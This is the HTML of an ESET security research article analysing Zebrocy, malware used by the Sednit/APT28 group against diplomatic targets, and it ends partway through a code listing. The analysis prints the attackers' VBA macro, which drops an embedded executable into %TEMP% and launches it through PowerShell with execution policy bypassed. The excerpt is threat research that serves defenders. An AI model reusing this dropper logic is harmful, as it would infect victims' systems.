<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Sednit update: Analysis of Zebrocy | WeLiveSecurity</title>
<meta name="description" content="ESET researchers&#039; analysis of the many new variants that appeared on a regular basis since 2017 clearly indicates that Zebrocy is being actively maintained and improved by its author(s)."/>
<link rel="canonical" href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Sednit update: Analysis of Zebrocy | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers&#039; analysis of the many new variants that appeared on a regular basis since 2017 clearly indicates that Zebrocy is being actively maintained and improved by its author(s)." />
<meta property="og:url" content="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2018-04-24T12:56:25+00:00" />
<meta property="article:modified_time" content="2018-04-26T08:16:17+00:00" />
<meta property="og:updated_time" content="2018-04-26T08:16:17+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2018/04/Sednit_Zebrocy.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2018/04/Sednit_Zebrocy.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="750" />
<meta property="og:image:alt" content="Zebrocy" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers&#039; analysis of the many new variants that appeared on a regular basis since 2017 clearly indicates that Zebrocy is being actively maintained and improved by its author(s)." />
<meta name="twitter:title" content="Sednit update: Analysis of Zebrocy | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2018/04/Sednit_Zebrocy.jpg" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2018/05/18/atualizacao-do-grupo-sednit-uma-analise-sobre-a-familia-de-malware-zebrocy/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2018/05/18/sednit-update-analysis-of-zebrocy/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2018/04/25/sednit-update-analyse-von-zebrocy/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2018/05/18/atualizacao-do-grupo-sednit-uma-analise-sobre-a-familia-de-malware-zebrocy/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2018/05/18/sednit-update-analysis-of-zebrocy/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2018/04/25/sednit-update-analyse-von-zebrocy/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2018/05/18/atualizacao-do-grupo-sednit-uma-analise-sobre-a-familia-de-malware-zebrocy/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2018/05/18/sednit-update-analysis-of-zebrocy/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2018/04/25/sednit-update-analyse-von-zebrocy/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2018/04/Sednit_Zebrocy.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>Sednit update: Analysis of Zebrocy</h1>
<div class="excerpt">Zebrocy heavily used by the Sednit group over last two years</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2018-04-24 14:56:25">24 Apr 2018 - 02:56PM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F04%2F24%2Fsednit-update-analysis-zebrocy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F04%2F24%2Fsednit-update-analysis-zebrocy%2F&text=Sednit update: Analysis of Zebrocy%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2018%2F04%2F24%2Fsednit-update-analysis-zebrocy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>Zebrocy heavily used by the Sednit group over last two years</p>
                            </div>

                            <p>The Sednit group – also known as APT28, Fancy Bear, Sofacy or STRONTIUM – is a group of attackers operating since 2004, if not earlier, and whose main objective is to steal confidential information from specific targets.</p>
<p>Toward the end of 2015, we started seeing a new component being deployed by the group: a downloader for the main Sednit backdoor, Xagent. Kaspersky mentioned this component for the first time in 2017 in their <a href="https://securelist.com/apt-trends-report-q2-2017/79332/" target="_blank" rel="noopener">APT trend report</a> and recently wrote an <a href="https://securelist.com/masha-and-these-bears/84311/" target="_blank" rel="noopener">article</a> where they quickly described it under the name Zebrocy.</p>
<p>This new component is a family of malware, comprising downloaders and backdoors written in <a href="https://en.wikipedia.org/wiki/Delphi_(IDE)" target="_blank" rel="noopener">Delphi</a> and <a href="https://en.wikipedia.org/wiki/AutoIt" target="_blank" rel="noopener">AutoIt</a>. These components play the same role in the Sednit ecosystem as Seduploader — that of first-stage malware.</p>
<p>Victims we have seen targeted by Zebrocy are located in Azerbaijan, Bosnia and Herzegovina, Egypt, Georgia, Iran, Kazakhstan, Korea, Kyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland, Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets include embassies, ministries of foreign affairs, and diplomats.</p>
<p>The Zebrocy family consists of three components. In the order of deployment these are a Delphi downloader, an AutoIt downloader and a Delphi backdoor. Figure 1 shows the relationship between these components.<br />
In this article we describe this family and how it can coexist with the older Seduploader reconnaissance tools. We will talk about some similarities to and differences from <a href="https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf" target="_blank" rel="noopener">Downdelph</a> at the end.</p>
<div id="attachment_110353" style="width: 2606px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy.png"><img class="size-full wp-image-110353" src="/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy.png" alt="" width="2596" height="2504" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy.png 2596w, https://www.welivesecurity.com/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy-300x289.png 300w, https://www.welivesecurity.com/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy-768x741.png 768w, https://www.welivesecurity.com/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy-1024x988.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2018/04/eset-infographic-blog_zebrocy-32x32.png 32w" sizes="(max-width: 2596px) 100vw, 2596px" /></a><p class="wp-caption-text">Figure 1: The Sednit ecosystem</p></div>
<p>Figure 1 shows the attack methods and active malware used by Sednit. Email attachments are the main entry point to the Sednit ecosystem. DealersChoice is still being used, as research from Palo Alto Networks mentioned in this recent <a href="https://researchcenter.paloaltonetworks.com/2018/03/unit42-sofacy-uses-dealerschoice-target-european-government-agency/" target="_blank" rel="noopener">blogpost</a>. Both Seduploader and Zebrocy are actively being delivered by the Sednit group through email attachments. Finally, after a reconnaissance phase, Xagent and Xtunnel are deployed on the targets deemed interesting by the operators.</p>
<h2>Attack methods</h2>
<p>The first component of a Zebrocy-based attack arrives as an email message. Victims are lured into opening email attachments that can be either Microsoft Office documents, or an archive.</p>
<h2>Malicious documents</h2>
<p>Malicious documents used by Sednit download the first stage payload via Visual Basic for Applications (VBA), exploits or even using Dynamic Data Exchange (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx" target="_blank" rel="noopener">DDE</a>).<br />
At the end of 2017, the Sednit group launched two campaigns delivering two different malicious documents. The first was named <span style="font-family: 'courier new', courier, monospace;">Syria &#8211; New Russia provocations.doc</span> and the second named <span style="font-family: 'courier new', courier, monospace;">Note Letter Mary Christmas Card.doc</span>.</p>
<div id="attachment_110756" style="width: 593px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/04/Figure2-1.png"><img class="size-full wp-image-110756" src="/wp-content/uploads/2018/04/Figure2-1.png" alt="" width="583" height="554" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure2-1.png 583w, https://www.welivesecurity.com/wp-content/uploads/2018/04/Figure2-1-300x285.png 300w" sizes="(max-width: 583px) 100vw, 583px" /></a><p class="wp-caption-text">Figure 2: Zebrocy’s malicious documents</p></div>
<p>Both malicious documents contain a VBA macro that creates a randomly-named file in <span style="font-family: 'courier new', courier, monospace;">%TEMP%</span>. The malware executable is then decoded and written into this file, which is then executed via a PowerShell command or via <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb776890(v=vs.85).aspx" target="_blank" rel="noopener">Scriptable Shell Objects</a>.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-605783236f98a738991334" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Visual Basic</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]

Sub AutoClose()

On Error Resume Next

vAdd = ""

For I = 1 To 8

vAdd = vAdd + Chr(97 + Rnd(20) * 25)

Next

vFileName = Environ("temp") &amp; "\" + vAdd &amp; ".e" + "x" &amp; "e"

SaveNew vFileName, UserForm1.Label1.Caption

Application.Run "XYZ", vFileName, "WScript.Shell"

End Sub

Public Function XYZ(vF, vW)

vStr = "powershell.exe -nop -Exec Bypass -Command Start-Process '" + vF + "';"

Call CreateObject(vW).Run(vStr, 0)

End Function

[...]

TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu

[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-605783236f98a738991334-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-2">2</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-4">4</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-6">6</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-8">8</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-10">10</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-12">12</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-14">14</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-16">16</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-18">18</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-20">20</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-22">22</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-24">24</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-26">26</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-28">28</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-30">30</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-32">32</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-34">34</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-605783236f98a738991334-36">36</div><div class="crayon-num" data-line="crayon-605783236f98a738991334-37">37</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-605783236f98a738991334-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-2">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-3"><span class="crayon-t">Sub</span><span class="crayon-h"> </span><span class="crayon-e">AutoClose</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-4">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-5"><span class="crayon-e">On </span><span class="crayon-t">Error</span><span class="crayon-h"> </span><span class="crayon-st">Resume</span><span class="crayon-h"> </span><span class="crayon-r">Next</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-6">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-7"><span class="crayon-v">vAdd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-8">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-9"><span class="crayon-st">For</span><span class="crayon-h"> </span><span class="crayon-v">I</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-st">To</span><span class="crayon-h"> </span><span class="crayon-cn">8</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-10">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-11"><span class="crayon-v">vAdd</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">vAdd</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">Chr</span><span class="crayon-sy">(</span><span class="crayon-cn">97</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-e">Rnd</span><span class="crayon-sy">(</span><span class="crayon-cn">20</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-cn">25</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-12">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-13"><span class="crayon-r">Next</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-14">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-15"><span class="crayon-v">vFileName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Environ</span><span class="crayon-sy">(</span><span class="crayon-s">"temp"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-s">"\" + vAdd &amp; "</span><span class="crayon-sy">.</span><span class="crayon-i">e</span><span class="crayon-s">" + "</span><span class="crayon-i">x</span><span class="crayon-s">" &amp; "</span><span class="crayon-i">e</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-16">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-17"><span class="crayon-s">SaveNew vFileName, UserForm1.Label1.Caption</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-18">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-19"><span class="crayon-s">Application.Run "</span><span class="crayon-i">XYZ</span><span class="crayon-s">", vFileName, "</span><span class="crayon-v">WScript</span><span class="crayon-sy">.</span><span class="crayon-i">Shell</span><span class="crayon-s">"</span></div><div class="crayon-line crayon-striped-line" id="crayon-605783236f98a738991334-20">&nbsp;</div><div class="crayon-line" id="crayon-605783236f98a738991334-21"><span class="crayon-s">End 